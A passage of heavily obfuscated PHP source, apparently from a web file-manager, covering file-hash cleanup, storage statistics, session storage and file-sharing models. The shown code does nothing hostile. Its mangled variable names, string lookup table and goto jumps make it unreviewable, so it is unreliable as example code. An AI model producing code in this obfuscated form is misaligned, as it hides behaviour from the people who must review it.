$•©ıà»); } } public function findByHash($¯¿§øƒ×, $ª‘˜ó = false) { $æÏ¥¶¶± =& $_SERVER[¡¬ıÜ ƒ]; if (!$¯¿§øƒ× && !$ª‘˜ó) { return !1; } $’·ïá’€ = array($æÏ¥¶¶±[2048] => $¯¿§øƒ×); if ($ª‘˜ó) { $’·ïá’€ = array($æÏ¥¶¶±[2049] => $ª‘˜ó); } return $this->order($æÏ¥¶¶±[2055])->where($’·ïá’€)->find(); } public function clearEmpty($»ÌûôıÖ = 1) { $çöï¿” =& $_SERVER[¡¬ıÜ ƒ]; $İ»Ü¯• = time() - 3600 * 24 * $»ÌûôıÖ; $÷ßàÉ€Ä = $çöï¿”[2056] . $İ»Ü¯•; $ÍŠôü²Ö = $this->where($÷ßàÉ€Ä)->select(); if (!$ÍŠôü²Ö) { return; } $´Í‹×à† = new Task($çöï¿”[2057], $çöï¿”[12], count($ÍŠôü²Ö)); foreach ($ÍŠôü²Ö as $Ä‡€²Äõ) { $´Í‹×à†->update(1); $this->resetFile($Ä‡€²Äõ); } $´Í‹×à†->end(); } public function resetFile($Äà×ÕÓë) { $ƒÆé©Ò£ =& $_SERVER[¡¬ıÜ ƒ]; $Î¥çÓ•Í = array($ƒÆé©Ò£[544] => $Äà×ÕÓë[$ƒÆé©Ò£[543]]); $Š¨¡°´Ô = Model($ƒÆé©Ò£[1432])->where($Î¥çÓ•Í)->count(); $šš£ÕïÇ = Model($ƒÆé©Ò£[2058])->where($Î¥çÓ•Í)->count(); $â÷é‘– = intval($Š¨¡°´Ô) + intval($šš£ÕïÇ); if ($â÷é‘– == 0) { IO::remove($Äà×ÕÓë[$ƒÆé©Ò£[87]]); Model($ƒÆé©Ò£[2059])->delete($Äà×ÕÓë[$ƒÆé©Ò£[543]]); $this->where($Î¥çÓ•Í)->delete(); $this->metaSet($Äà×ÕÓë[$ƒÆé©Ò£[543]], null, null); write_log(ACTION . $ƒÆé©Ò£[2060] . KodUser::id() . $ƒÆé©Ò£[2061] . $Äà×ÕÓë[$ƒÆé©Ò£[543]] . $ƒÆé©Ò£[2062] . $Äà×ÕÓë[$ƒÆé©Ò£[79]] . $ƒÆé©Ò£[201] . $Äà×ÕÓë[$ƒÆé©Ò£[87]], $ƒÆé©Ò£[2063]); return; } if ($Äà×ÕÓë[$ƒÆé©Ò£[2054]] != $â÷é‘–) { $this->where($Î¥çÓ•Í)->save(array($ƒÆé©Ò£[2047] => $â÷é‘–)); } } public function storageInfo($’ØşÛö = false) { $‚í™ïÇ =& $_SERVER[¡¬ıÜ ƒ]; $²¡ôËú‰ = $this->count() + 0.0; $Œ³²«õÁ = 0; $¾»óö² = 1; $Ã®¥ÍÖ = 0; $µ´••á = 5000; for ($•à§…Æ¾ = 0; $•à§…Æ¾ < $²¡ôËú‰; $•à§…Æ¾ = $•à§…Æ¾ + $µ´••á) { $“Îî’»ö = $this->limit($•à§…Æ¾, $•à§…Æ¾ + $µ´••á)->select(); foreach ($“Îî’»ö as $ã²Î¡¥) { $¾»óö² += $ã²Î¡¥[$‚í™ïÇ[79]] * $ã²Î¡¥[$‚í™ïÇ[2054]]; $Œ³²«õÁ += $ã²Î¡¥[$‚í™ïÇ[79]] * ($ã²Î¡¥[$‚í™ïÇ[2054]] - 1); $Ã®¥ÍÖ += $ã²Î¡¥[$‚í™ïÇ[2054]]; } } $ø­éÉò› = array($‚í™ïÇ[2064] => $¾»óö², $‚í™ïÇ[2065] => $Œ³²«õÁ, $‚í™ïÇ[2066] => $Œ³²«õÁ / $¾»óö², $‚í™ïÇ[83] => $²¡ôËú‰, $‚í™ïÇ[2067] => $Ã®¥ÍÖ); return $ø­éÉò›; } } goto c‰•Ûæ‰; a›ùïƒ°ğŞ: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\137\x73\145\x73\163\151\157\156"; public function get($“¹Šà½) { $ğí‚ï³ =& $_SERVER[¡¬ıÜ ƒ]; $·ñËÉ¦Ğ = $this->where(array($ğí‚ï³[2125] => $“¹Šà½))->find(); if (!is_array($·ñËÉ¦Ğ)) { return !1; } return $·ñËÉ¦Ğ[$ğí‚ï³[171]]; } public function set($ ¸Å¬×İ, $ì’´ÖùÖ, $‰Äø·¹Á = 3600) { $‰Ø¡ =& $_SERVER[¡¬ıÜ ƒ]; $¹²û¦ìà = array($‰Ø¡[2125] => $ ¸Å¬×İ, $‰Ø¡[2025] => $ì’´ÖùÖ, $‰Ø¡[2126] => $‰Äø·¹Á + time()); if (Session::get($‰Ø¡[2127])) { $¹²û¦ìà[$‰Ø¡[1785]] = Session::get($‰Ø¡[2127]); } else { $¹²û¦ìà[$‰Ø¡[1785]] = 0; } if ($this->get($ ¸Å¬×İ)) { return $this->where(array($‰Ø¡[2125] => $ ¸Å¬×İ))->save($¹²û¦ìà); } else { return $this->add($¹²û¦ìà, array(), !0); } } public function remove($ÒÚ­Óš‹) { return $this->where(array($_SERVER[¡¬ıÜ ƒ][2125] => $ÒÚ­Óš‹))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¡¬ıÜ ƒ][2128] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\155\157\144\151\x66\x79\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\x73\x65\162\164\x2c\165\160\x64\141\164\145", "\x66\165\x6e\143\x74\x69\x6f\156"), array("\x63\x72\x65\x61\x74\x65\x54\x69\x6d\x65", "\164\151\155\x65", "\151\x6e\163\x65\x72\x74", "\x66\x75\x6e\x63\x74\151\157\156"), array("\x6f\x70\x74\x69\x6f\156\163", '', "\151\x6e\x73\x65\x72\x74\54\165\160\x64\141\164\145\x2c\163\x65\x6c\145\x63\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ ¤ê) { $–Åê…Øı =& $_SERVER[¡¬ıÜ ƒ]; $Ç¡®Ã” = isset($ ¤ê[0]) ? $ ¤ê[0] : !1; $Öå×·ªÊ = $–Åê…Øı[2129] . USER_ID; return array($–Åê…Øı[2130] => array(USER_ID, $–Åê…Øı[2131], $Öå×·ªÊ), $–Åê…Øı[2070] => array($Ç¡®Ã”, $–Åê…Øı[2132], $Öå×·ªÊ)); } protected function listSimple() { $ÖÎ€‡áò = array($_SERVER[¡¬ıÜ ƒ][1785] => USER_ID); $ÍÎùƒ×Ş = $this->field($this->fieldList)->where($ÖÎ€‡áò)->select(); return $ÍÎùƒ×Ş ? $ÍÎùƒ×Ş : array(); } protected function getInfo($ûÈ®²Æ£, $ôªğØ³ = false, $†ïŞ÷Âü = '') { $²ıÏŞÁ =& $_SERVER[¡¬ıÜ ƒ]; if ($ôªğØ³) { return $this->_getShareInfo(array($²ıÏŞÁ[670] => $ûÈ®²Æ£)); } $æ®ğ™¨ = $this->cacheFunctionGet($²ıÏŞÁ[2072], $ûÈ®²Æ£, $†ïŞ÷Âü); return $æ®ğ™¨; } public function getInfoByHash($ÅÊßŠÉÒ) { return $this->_getShareInfo(array($_SERVER[¡¬ıÜ ƒ][2133] => $ÅÊßŠÉÒ)); } public function getInfoByPath($„Ò¼ÄŠ‡) { $ÌØù· =& $_SERVER[¡¬ıÜ ƒ]; $‘Š‡ÚÏı = array($ÌØù·[1785] => USER_ID, $ÌØù·[193] => $„Ò¼ÄŠ‡); return $this->_getShareInfo($‘Š‡ÚÏı); } public function getInfoBySourcePath($•£ˆ‡à‹) { $Ã¢É¢ê· =& $_SERVER[¡¬ıÜ ƒ]; $ÁÅÍ÷ÓŠ = array($Ã¢É¢ê·[1785] => USER_ID, $Ã¢É¢ê·[1268] => $•£ˆ‡à‹); return $this->_getShareInfo($ÁÅÍ÷ÓŠ); } private function _getShareInfo($¸ÉòÓ‡¡) { $ûá•ÛŠº =& $_SERVER[¡¬ıÜ ƒ]; $‚¶Ê•‡ = $this->where($¸ÉòÓ‡¡)->find(); if (!$‚¶Ê•‡) { return !1; } $¸ÉòÓ‡¡ = array($ûá•ÛŠº[670] => $‚¶Ê•‡[$ûá•ÛŠº[670]]); $ƒàÕôƒ = $ûá•ÛŠº[2134]; $Üï÷øâ = Model($ûá•ÛŠº[671])->order($ûá•ÛŠº[477])->field($ƒàÕôƒ)->where($¸ÉòÓ‡¡)->select(); if ($‚¶Ê•‡[$ûá•ÛŠº[193]] == $ûá•ÛŠº[230]) { $‚¶Ê•‡[$ûá•ÛŠº[90]] = IO::info($‚¶Ê•‡[$ûá•ÛŠº[1268]]); } else { $‚¶Ê•‡[$ûá•ÛŠº[90]] = Model($ûá•ÛŠº[1432])->pathInfo($‚¶Ê•‡[$ûá•ÛŠº[193]]); } $‚¶Ê•‡[$ûá•ÛŠº[2135]] = $Üï÷øâ; return $‚¶Ê•‡; } protected function getInfoAuth($˜çƒšñ¤) { $åâ´èò =& $_SERVER[¡¬ıÜ ƒ]; $ô¼é§ÑÁ = $this->getInfo($˜çƒšñ¤); if ($ô¼é§ÑÁ[$åâ´èò[1785]] == USER_ID) { $ô¼é§ÑÁ[$åâ´èò[489]] = $ô¼é§ÑÁ[$åâ´èò[90]][$åâ´èò[489]]; } else { $ô¼é§ÑÁ[$åâ´èò[489]] = Model($åâ´èò[569])->authMake($ô¼é§ÑÁ[$åâ´èò[2135]]); } return $ô¼é§ÑÁ; } protected function listData($œ¼ÑÁäğ = null, $Şµ·ùÒº = 300) { $ÌÅ½¸¯Û =& $_SERVER[¡¬ıÜ ƒ]; $ƒßëÃİ· = array(array($ÌÅ½¸¯Û[564] => array($ÌÅ½¸¯Û[1100], 0), $ÌÅ½¸¯Û[668] => array($ÌÅ½¸¯Û[1100], 0), $ÌÅ½¸¯Û[2136] => $ÌÅ½¸¯Û[2088])); if ($œ¼ÑÁäğ == $ÌÅ½¸¯Û[2137]) { $ƒßëÃİ· = array($ÌÅ½¸¯Û[564] => 1); } else { if ($œ¼ÑÁäğ == $ÌÅ½¸¯Û[1253]) { $ƒßëÃİ· = array($ÌÅ½¸¯Û[668] => 1); } } $ƒßëÃİ·[$ÌÅ½¸¯Û[1785]] = USER_ID; $Ã†‡†ã¢ = $this->where($ƒßëÃİ·)->selectPage($Şµ·ùÒº); return $Ã†‡†ã¢; } protected function listToMe($Òü¦ÕÅ = 300) { $£Äãå¥ô =& $_SERVER[¡¬ıÜ ƒ]; $ı–÷¿¢ˆ = Model($£Äãå¥ô[2138])->userGroupParents(USER_ID); $ïÕ³¨¶¿ = array($£Äãå¥ô[653] => SourceModel::TYPE_USER, $£Äãå¥ô[571] => USER_ID); if ($ı–÷¿¢ˆ) { $ïÕ³¨¶¿ = array(array($£Äãå¥ô[653] => SourceModel::TYPE_USER, $£Äãå¥ô[571] => USER_ID), array($£Äãå¥ô[653] => SourceModel::TYPE_GROUP, $£Äãå¥ô[571] => array($£Äãå¥ô[7], $ı–÷¿¢ˆ)), $£Äãå¥ô[2136] => $£Äãå¥ô[2088]); } $€ªÜÍıš = Model($£Äãå¥ô[671])->where($ïÕ³¨¶¿)->selectPage($Òü¦ÕÅ); $´ÉéËÚû = array_to_keyvalue_group($€ªÜÍıš[$£Äãå¥ô[447]], $£Äãå¥ô[670]); if (!$´ÉéËÚû) { return $€ªÜÍıš; } $Ëù™ µĞ = $£Äãå¥ô[2139]; $ïÕ³¨¶¿ = array($£Äãå¥ô[670] => array($£Äãå¥ô[494], array_keys($´ÉéËÚû)), $£Äãå¥ô[1785] => array($£Äãå¥ô[1102], $£Äãå¥ô[230])); $†­“…©å = $this->field($Ëù™ µĞ)->where($ïÕ³¨¶¿)->select(); foreach ($†­“…©å as $ğÛ°†Šş => &$ıÂ²ŠĞ¿) { $ıÂ²ŠĞ¿[$£Äãå¥ô[2135]] = $´ÉéËÚû[$ıÂ²ŠĞ¿[$£Äãå¥ô[670]]]; } unset($ıÂ²ŠĞ¿); $û£êº£‹ = array($£Äãå¥ô[2140] => $†­“…©å, $£Äãå¥ô[2141] => $€ªÜÍıš[$£Äãå¥ô[444]]); return $û£êº£‹; } protected function shareAdd($ä»ÇÒ„å, $¹‘»™ÄÕ) { $×Ç¨»Ã =& $_SERVER[¡¬ıÜ ƒ]; $Å€š  = $this->_addShareData($ä»ÇÒ„å, $¹‘»™ÄÕ); if (!empty($¹‘»™ÄÕ[$×Ç¨»Ã[2142]])) { $this->_shareAuthSet($Å€š , $¹‘»™ÄÕ[$×Ç¨»Ã[2142]]); } $this->shareEventAdd($ä»ÇÒ„å, $¹‘»™ÄÕ, $×Ç¨»Ã[2143]); return $Å€š ; } protected function shareAddSystem($¶¾–â¹Ä, $˜›•Š¼) { $¥šüõïü =& $_SERVER[¡¬ıÜ ƒ]; $îà•Âé  = $this->_addShareData($¶¾–â¹Ä, $˜›•Š¼, $¥šüõïü[191]); $this->_shareAuthSet($îà•Âé , $˜›•Š¼[$¥šüõïü[2142]]); return $îà•Âé ; } private function shareEventAdd($ó”üê£, $Ÿæ«ü¾, $š°Ë²É = "\141\x64\144") { $ŠØ€¯Àš =& $_SERVER[¡¬ıÜ ƒ]; if (!$ó”üê£ || $ó”üê£ == $ŠØ€¯Àš[230]) { return; } if ($š°Ë²É == $ŠØ€¯Àš[2143]) { if ($Ÿæ«ü¾[$ŠØ€¯Àš[564]] == $ŠØ€¯Àš[91]) { Model($ŠØ€¯Àš[638])->eventShare($ó”üê£, $ŠØ€¯Àš[2144]); } if ($Ÿæ«ü¾[$ŠØ€¯Àš[668]] == $ŠØ€¯Àš[91]) { Model($ŠØ€¯Àš[638])->eventShare($ó”üê£, $ŠØ€¯Àš[2145]); } return; } $ìåíÉ¦ = $this->getInfoByPath($ó”üê£); $Ø‘Ä–…ä = $ŠØ€¯Àš[2146]; if ($ìåíÉ¦[$ŠØ€¯Àš[564]] == $ŠØ€¯Àš[230] && $Ÿæ«ü¾[$ŠØ€¯Àš[564]] == $ŠØ€¯Àš[91]) { $Ø‘Ä–…ä = $ŠØ€¯Àš[2144]; } if ($ìåíÉ¦[$ŠØ€¯Àš[564]] == $ŠØ€¯Àš[91] && $Ÿæ«ü¾[$ŠØ€¯Àš[564]] == $ŠØ€¯Àš[230]) { $Ø‘Ä–…ä = $ŠØ€¯Àš[2147]; } if ($ìåíÉ¦[$ŠØ€¯Àš[668]] == $ŠØ€¯Àš[230] && $Ÿæ«ü¾[$ŠØ€¯Àš[668]] == $ŠØ€¯Àš[91]) { $Ø‘Ä–…ä = $ŠØ€¯Àš[2145]; } if ($ìåíÉ¦[$ŠØ€¯Àš[668]] == $ŠØ€¯Àš[91] && $Ÿæ«ü¾[$ŠØ€¯Àš[668]] == $ŠØ€¯Àš[230]) { $Ø‘Ä–…ä = $ŠØ€¯Àš[2148]; } Model($ŠØ€¯Àš[638])->eventShare($ó”üê£, $Ø‘Ä–…ä); return; } private function _addShareData($ †ÄÈÆ, $ÃšÄ = array(), $‡—ÚÀ™Ì = false) { $àğ’¸‘§ =& $_SERVER[¡¬ıÜ ƒ]; $ê»‡Ô»Æ = $‡—ÚÀ™Ì == $àğ’¸‘§[191] ? 0 : USER_ID; $ƒ»’ú»ƒ = array($àğ’¸‘§[493] => $ †ÄÈÆ, $àğ’¸‘§[1776] => $ê»‡Ô»Æ); if ($ †ÄÈÆ == 0) { $ƒ»’ú»ƒ = array($àğ’¸‘§[2149] => $ÃšÄ[$àğ’¸‘§[1268]], $àğ’¸‘§[1776] => $ê»‡Ô»Æ); } if ($Îı“€˜ = $this->where($ƒ»’ú»ƒ)->find()) { return $Îı“€˜[$àğ’¸‘§[670]]; } if ($ †ÄÈÆ == 0) { $ÛÑ•Ïã… = array($àğ’¸‘§[32] => get_path_this($ÃšÄ[$àğ’¸‘§[87]])); } else { $ÛÑ•Ïã… = Model($àğ’¸‘§[914])->sourceInfo($ †ÄÈÆ); if (!$ÛÑ•Ïã…) { return !1; } } if (!$ÃšÄ[$àğ’¸‘§[1671]]) { $ÃšÄ[$àğ’¸‘§[1671]] = $ÛÑ•Ïã…[$àğ’¸‘§[32]]; } $î€ƒ…‰ = array($àğ’¸‘§[1776] => $ê»‡Ô»Æ, $àğ’¸‘§[493] => $ †ÄÈÆ, $àğ’¸‘§[1671] => $àğ’¸‘§[12], $àğ’¸‘§[564] => 0, $àğ’¸‘§[668] => 0, $àğ’¸‘§[1268] => $àğ’¸‘§[12], $àğ’¸‘§[384] => $àğ’¸‘§[12], $àğ’¸‘§[977] => $àğ’¸‘§[12], $àğ’¸‘§[2150] => 0, $àğ’¸‘§[2151] => 0, $àğ’¸‘§[841] => 0, $àğ’¸‘§[2152] => $àğ’¸‘§[12], $àğ’¸‘§[2133] => $àğ’¸‘§[12]); $“Øï£Ùö = explode($àğ’¸‘§[50], $àğ’¸‘§[2153]); foreach ($“Øï£Ùö as $ èèØŞ) { if (!isset($ÃšÄ[$ èèØŞ])) { continue; } $î€ƒ…‰[$ èèØŞ] = $ÃšÄ[$ èèØŞ]; } $ĞûÚş¿ = $this->add($î€ƒ…‰); $êå”Ë‡í = array($àğ’¸‘§[2133] => short_id($ĞûÚş¿)); $this->where(array($àğ’¸‘§[2154] => $ĞûÚş¿))->save($êå”Ë‡í); return $ĞûÚş¿; } private function _shareAuthSet($‘¾Ã‡â¶, $Ä˜ÈÎ²®) { $· Â…şÌ =& $_SERVER[¡¬ıÜ ƒ]; if (!is_array($Ä˜ÈÎ²®)) { return !1; } $şÁ½¼„¸ = Model($· Â…şÌ[2098]); $şÁ½¼„¸->where(array($· Â…şÌ[670] => $‘¾Ã‡â¶))->delete(); $Õ±¤ÕŸÑ = array(); foreach ($Ä˜ÈÎ²® as $Õ×’Æ—Í) { $œÎÃ¸¼ = SourceModel::TYPE_USER; if ($Õ×’Æ—Í[$· Â…şÌ[190]] == SourceModel::TYPE_GROUP) { $œÎÃ¸¼ = SourceModel::TYPE_GROUP; } $¸‰äÃ©Ç = array($· Â…şÌ[670] => $‘¾Ã‡â¶, $· Â…şÌ[190] => $œÎÃ¸¼, $· Â…şÌ[571] => intval($Õ×’Æ—Í[$· Â…şÌ[571]]), $· Â…şÌ[2094] => 0, $· Â…şÌ[2155] => -1); if ($Õ×’Æ—Í[$· Â…şÌ[2094]]) { $¸‰äÃ©Ç[$· Â…şÌ[2094]] = $Õ×’Æ—Í[$· Â…şÌ[2094]]; } else { if ($Õ×’Æ—Í[$· Â…şÌ[2155]]) { $¸‰äÃ©Ç[$· Â…şÌ[2155]] = $Õ×’Æ—Í[$· Â…şÌ[2155]]; } } $Õ±¤ÕŸÑ[] = $¸‰äÃ©Ç; } return $şÁ½¼„¸->addAll($Õ±¤ÕŸÑ, array(), !0); } public function numViewAdd($£øˆ‚´‚) { $ï£í÷‚™ =& $_SERVER[¡¬ıÜ ƒ]; $©Íè‰øã = array($ï£í÷‚™[2154] => $£øˆ‚´‚); $this->where($©Íè‰øã)->setAdd($ï£í÷‚™[2150]); } public function numDownloadAdd($Šëå®š) { $íÖ†ŞÓà =& $_SERVER[¡¬ıÜ ƒ]; $®ŞœŸ·œ = array($íÖ†ŞÓà[2154] => $Šëå®š); $this->where($®ŞœŸ·œ)->setAdd($íÖ†ŞÓà[2151]); } protected function shareEdit($ŞÕ©‚ã±, $ŠöĞîı¤) { $à½ôËŠ´ =& $_SERVER[¡¬ıÜ ƒ]; $Œ§ğÏÃî = $this->getInfo($ŞÕ©‚ã±); if (!$Œ§ğÏÃî) { return !1; } $this->_checkLinkShare($ŠöĞîı¤, $Œ§ğÏÃî); $üñ£òÄ½ = array(); $ÌÅÉ¦ÍË = explode($à½ôËŠ´[50], $à½ôËŠ´[2156]); foreach ($ÌÅÉ¦ÍË as $Ä«ºÍÒ) { if (!array_key_exists($Ä«ºÍÒ, $ŠöĞîı¤)) { continue; } $üñ£òÄ½[$Ä«ºÍÒ] = $ŠöĞîı¤[$Ä«ºÍÒ]; } $this->shareEventAdd($Œ§ğÏÃî[$à½ôËŠ´[193]], $ŠöĞîı¤, $à½ôËŠ´[1955]); $this->where(array($à½ôËŠ´[2154] => $ŞÕ©‚ã±))->save($üñ£òÄ½); if (isset($ŠöĞîı¤[$à½ôËŠ´[2142]])) { $this->_shareAuthSet($ŞÕ©‚ã±, $ŠöĞîı¤[$à½ôËŠ´[2142]]); } return !0; } private function _checkLinkShare($ûÊ÷¶Ô, $ñÂŒç¨) { $Øõô¢û =& $_SERVER[¡¬ıÜ ƒ]; if ($ûÊ÷¶Ô[$Øõô¢û[564]] != $Øõô¢û[91]) { return; } $Â°ãü½£ = $ñÂŒç¨[$Øõô¢û[90]][$Øõô¢û[193]]; if ($ñÂŒç¨[$Øõô¢û[90]][$Øõô¢û[33]] != $Øõô¢û[232]) { $É ™Öä÷ = $this->_folderReport($Â°ãü½£); if (!$É ™Öä÷) { return; } show_json(LNG($Øõô¢û[2157]) . $Øõô¢û[2158] . $É ™Öä÷, !1); } $×ì²ºÈó = Model($Øõô¢û[914])->fileInfoGet($ñÂŒç¨[$Øõô¢û[90]][$Øõô¢û[193]]); if (!$×ì²ºÈó) { return; } $€Ëü§¿ì = $this->shareFileMeta($×ì²ºÈó[$Øõô¢û[543]]); if (isset($€Ëü§¿ì[$Øõô¢û[452]]) && $€Ëü§¿ì[$Øõô¢û[452]] == $Øõô¢û[91]) { show_json(LNG($Øõô¢û[2159]), !1); } } private function _folderReport($ê„ñóİ) { $‘ê¶›“ =& $_SERVER[¡¬ıÜ ƒ]; $§š‚Ú¸¼ = array($‘ê¶›“[543] => array($‘ê¶›“[1100], 0), $‘ê¶›“[830] => 3); $Óı¹Áã¸ = Model($‘ê¶›“[2160])->where($§š‚Ú¸¼)->field($‘ê¶›“[543])->select(); if (!$Óı¹Áã¸) { return !1; } $Óı¹Áã¸ = array_to_keyvalue($Óı¹Áã¸, $‘ê¶›“[12], $‘ê¶›“[543]); $Îë†Ïå‹ = $‘ê¶›“[50] . $ê„ñóİ . $‘ê¶›“[50]; $§š‚Ú¸¼ = array($‘ê¶›“[543] => array($‘ê¶›“[7], $Óı¹Áã¸), $‘ê¶›“[586] => array($‘ê¶›“[461], "\45{$Îë†Ïå‹}\x25"), $‘ê¶›“[507] => 0); $·¬¿Š—œ = Model($‘ê¶›“[914])->where($§š‚Ú¸¼)->field($‘ê¶›“[2161])->find(); if (!$·¬¿Š—œ) { return !1; } $È¤æ¹İÜ = substr($·¬¿Š—œ[$‘ê¶›“[586]], strpos($·¬¿Š—œ[$‘ê¶›“[586]], $Îë†Ïå‹)); $§š‚Ú¸¼ = array($‘ê¶›“[193] => array($‘ê¶›“[7], trim($È¤æ¹İÜ, $‘ê¶›“[50]))); $ÕĞÁÕ§¸ = Model($‘ê¶›“[914])->where($§š‚Ú¸¼)->field($‘ê¶›“[32])->select(); $úêñô¹¼ = array_to_keyvalue($ÕĞÁÕ§¸, $‘ê¶›“[12], $‘ê¶›“[32]); $úêñô¹¼[] = $·¬¿Š—œ[$‘ê¶›“[32]]; return implode($‘ê¶›“[8], $úêñô¹¼); } protected function remove($¼Ï²¨Ò) { $ğïàä¦ =& $_SERVER[¡¬ıÜ ƒ]; $½åÜëŠ® = is_array($¼Ï²¨Ò) ? $¼Ï²¨Ò : array($¼Ï²¨Ò); for ($çœÏÜÔô = 0; $çœÏÜÔô < count($½åÜëŠ®); $çœÏÜÔô++) { $ûâ‘ÂÁï = $this->getInfo($½åÜëŠ®[$çœÏÜÔô]); if ($ûâ‘ÂÁï[$ğïàä¦[668]] == $ğïàä¦[91]) { Model($ğïàä¦[638])->eventShare($ûâ‘ÂÁï[$ğïàä¦[193]], $ğïàä¦[2148]); } if ($ûâ‘ÂÁï[$ğïàä¦[564]] == $ğïàä¦[91]) { Model($ğïàä¦[638])->eventShare($ûâ‘ÂÁï[$ğïàä¦[193]], $ğïàä¦[2147]); } } if (is_array($¼Ï²¨Ò)) { $¼Ï²¨Ò = array($ğïàä¦[7], $¼Ï²¨Ò); } $ÛòÑàÇ = array($ğïàä¦[670] => $¼Ï²¨Ò); $ØŸä·áÓ = $this->where($ÛòÑàÇ)->delete(); if ($ØŸä·áÓ) { Model($ğïàä¦[671])->where(array($ğïàä¦[670] => $¼Ï²¨Ò))->delete(); } return $ØŸä·áÓ; } protected function removeBySource($Ñî€ÁÚÁ) { $ñ¡îïšÕ =& $_SERVER[¡¬ıÜ ƒ]; $ïĞ›ûÜş = array($ñ¡îïšÕ[493] => array($ñ¡îïšÕ[494], $Ñî€ÁÚÁ)); $Áİç˜—Î = $this->field($ñ¡îïšÕ[670])->where($ïĞ›ûÜş)->select(); $Áİç˜—Î = array_to_keyvalue($Áİç˜—Î, $ñ¡îïšÕ[12], $ñ¡îïšÕ[670]); if (!$Áİç˜—Î) { return; } $ïĞ›ûÜş = array($ñ¡îïšÕ[2154] => array($ñ¡îïšÕ[494], $Áİç˜—Î)); $this->where($ïĞ›ûÜş)->delete(); Model($ñ¡îïšÕ[671])->where($ïĞ›ûÜş)->delete(); } public function listAll($ÀÓÜãÛÌ) { $è¬²£§Ö =& $_SERVER[¡¬ıÜ ƒ]; $ßÂÎÇäŠ = array(); if ($ÀÓÜãÛÌ[$è¬²£§Ö[1785]]) { $ßÂÎÇäŠ[$è¬²£§Ö[1785]] = $ÀÓÜãÛÌ[$è¬²£§Ö[1785]]; } if ($ÀÓÜãÛÌ[$è¬²£§Ö[840]]) { $¨èê£©’ = $ÀÓÜãÛÌ[$è¬²£§Ö[841]] ? $ÀÓÜãÛÌ[$è¬²£§Ö[841]] : strtotime(date($è¬²£§Ö[2162])); $ßÂÎÇäŠ[$è¬²£§Ö[233]] = array($è¬²£§Ö[410], array($ÀÓÜãÛÌ[$è¬²£§Ö[840]], $¨èê£©’)); } if ($ÀÓÜãÛÌ[$è¬²£§Ö[33]]) { $ßÂÎÇäŠ[$ÀÓÜãÛÌ[$è¬²£§Ö[33]]] = 1; } else { $ßÂÎÇäŠ[] = array($è¬²£§Ö[564] => array($è¬²£§Ö[1100], 0), $è¬²£§Ö[668] => array($è¬²£§Ö[1100], 0), $è¬²£§Ö[2136] => $è¬²£§Ö[2088]); } if ($ÀÓÜãÛÌ[$è¬²£§Ö[2084]]) { $ßÂÎÇäŠ[] = array($è¬²£§Ö[2133] => $ÀÓÜãÛÌ[$è¬²£§Ö[2084]], $è¬²£§Ö[1671] => array($è¬²£§Ö[461], "\x25{$ÀÓÜãÛÌ[$è¬²£§Ö[2084]]}\45"), $è¬²£§Ö[2136] => $è¬²£§Ö[2088]); } $ö–Â¾Äº = $this->_makeOrder()->where($ßÂÎÇäŠ)->selectPage(20); if (empty($ö–Â¾Äº[$è¬²£§Ö[447]])) { return array(); } $this->_listDataApply($ö–Â¾Äº[$è¬²£§Ö[447]]); return $ö–Â¾Äº; } public function listDataApply($Î÷‰äÀ) { $this->_listDataApply($Î÷‰äÀ); return $Î÷‰äÀ; } private function _listDataApply(&$İÂû¾¡Ñ) { $œû›ÜÉİ =& $_SERVER[¡¬ıÜ ƒ]; $Ä»ÍÉê = array_to_keyvalue($İÂû¾¡Ñ, $œû›ÜÉİ[12], $œû›ÜÉİ[1785]); $÷ê±ûµï = Model($œû›ÜÉİ[599])->userListInfo(array_unique($Ä»ÍÉê)); $Ù×¶ê”Ë = array_to_keyvalue($İÂû¾¡Ñ, $œû›ÜÉİ[12], $œû›ÜÉİ[193]); $„¬•§¥¾ = Model($œû›ÜÉİ[914])->sourceListInfo($Ù×¶ê”Ë, !0); foreach ($İÂû¾¡Ñ as $ÜöÙøÈ€ => &$´©µŠˆŸ) { $¬®ÊÑ¼ = $´©µŠˆŸ[$œû›ÜÉİ[1785]]; $´©µŠˆŸ[$œû›ÜÉİ[2163]] = $÷ê±ûµï[$¬®ÊÑ¼] ? $÷ê±ûµï[$¬®ÊÑ¼] : !1; $ÂäñçÂ = $´©µŠˆŸ[$œû›ÜÉİ[193]]; $´©µŠˆŸ[$œû›ÜÉİ[90]] = $„¬•§¥¾[$ÂäñçÂ] ? $„¬•§¥¾[$ÂäñçÂ] : !1; if ($´©µŠˆŸ[$œû›ÜÉİ[90]][$œû›ÜÉİ[507]] == $œû›ÜÉİ[91]) { unset($İÂû¾¡Ñ[$ÜöÙøÈ€]); } if ($´©µŠˆŸ[$œû›ÜÉİ[90]] != $œû›ÜÉİ[230] && !$´©µŠˆŸ[$œû›ÜÉİ[90]]) { unset($İÂû¾¡Ñ[$ÜöÙøÈ€]); } } unset($´©µŠˆŸ); $İÂû¾¡Ñ = array_values($İÂû¾¡Ñ); } private function _makeOrder($Ê‚‡×ş¢ = '') { $±¤¨¶³Ü =& $_SERVER[¡¬ıÜ ƒ]; $šÙôíÅ = array($±¤¨¶³Ü[233], $±¤¨¶³Ü[841], $±¤¨¶³Ü[2150], $±¤¨¶³Ü[2151]); $¯Î¿¶¸Š = array($±¤¨¶³Ü[525] => $±¤¨¶³Ü[526], $±¤¨¶³Ü[527] => $±¤¨¶³Ü[528]); $‹”Ç£‰ = Input::get($±¤¨¶³Ü[532], $±¤¨¶³Ü[7], $±¤¨¶³Ü[499], $šÙôíÅ); $÷®ğè¤Õ = Input::get($±¤¨¶³Ü[533], $±¤¨¶³Ü[7], $±¤¨¶³Ü[2164], array($±¤¨¶³Ü[2081], $±¤¨¶³Ü[527])); $÷®ğè¤Õ = $¯Î¿¶¸Š[$÷®ğè¤Õ]; $Ê‚‡×ş¢ = $Ê‚‡×ş¢ . "{$‹”Ç£‰}\40{$÷®ğè¤Õ}"; return $this->order($Ê‚‡×ş¢); } public function reportAdd($ğç‰Õ‘ª) { $‘¶ê˜åÈ =& $_SERVER[¡¬ıÜ ƒ]; $àƒá¡ñ× = array($‘¶ê˜åÈ[670] => $ğç‰Õ‘ª[$‘¶ê˜åÈ[670]], $‘¶ê˜åÈ[1785] => USER_ID); if 